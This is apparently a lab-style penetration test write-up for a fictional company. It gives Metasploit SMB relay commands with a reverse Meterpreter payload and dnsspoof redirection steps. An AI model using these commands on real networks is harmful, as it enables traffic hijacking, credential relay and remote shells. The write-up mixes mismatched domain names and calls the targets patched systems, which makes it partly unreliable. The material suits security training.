# Internal Penetration Test – Slytherin Solutions

## Scenario

You have been hired by Slytherin Solutions, a mid-sized technology company, to conduct a security assessment. The company wants to evaluate potential risks within its internal network and has authorized a controlled penetration test within the defined scope.

**Scope & Rules of Engagement**

- The penetration test is internal, meaning you are connected directly to their LAN.

- The network range for testing is 192.168.50.0/24.

- No credential brute-forcing to avoid locking out user accounts.

- Focus on network-based attacks, specifically SMB Relay and DNS spoofing.


**Objectives**

- Exploit misconfigurations using SMB Relay Attack.

- Manipulate network traffic using dnsspoof to redirect victims.


**Skills & Techniques Covered**

* Performing SMB Relay attacks against patched systems.
* Using dnsspoof to manipulate network traffic and redirect requests.
* Leveraging Metasploit for exploitation and session management.

**Tools Required**

- dnsspoof (for ARP and DNS spoofing)

- Metasploit Framework (for SMB relay exploitation)

## SMB Relay Attack Execution
In this scenario, I launched an SMB Relay Attack to intercept and relay authentication requests from a client machine to a target system, ultimately gaining a Meterpreter shell.

**Attack Flow**

* A client machine (192.168.50.12, running Windows 7) automatically attempts an SMB connection to \\fileserver.slytherin.local\wallet$ every 30 seconds.

* The attacker machine (192.168.50.23) spoofs the IP address of fileserver.cyberhat.local to redirect SMB traffic.
* The client unknowingly connects to the attacker's machine instead of the real fileserver.slytherin.local.
*  The SMB Relay exploit (running on the attacker machine) captures and relays the authentication request to a vulnerable target (192.168.50.4).
*  The exploit successfully authenticates on the target and delivers a Windows Meterpreter shell, granting access to the system.

**Attack Execution**

Step 1: Start msfconsole and configure the SMB Relay exploit

````bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 192.168.50.23
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.50.23
set SMBHOST 192.168.50.4
exploit
````

Step 2: In a new tab, configure dnsspoof in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain: slytherin.com. Create a file with fake dns entry with all subdomains of
slytherin.com pointing to our attacker machine.

''''bash
echo "192.168.50.23 *.slytherin.com" > hosts
''''

run dns spoof in the same tab
''''bash
dnsspoof -i eth1 -f hosts
''''
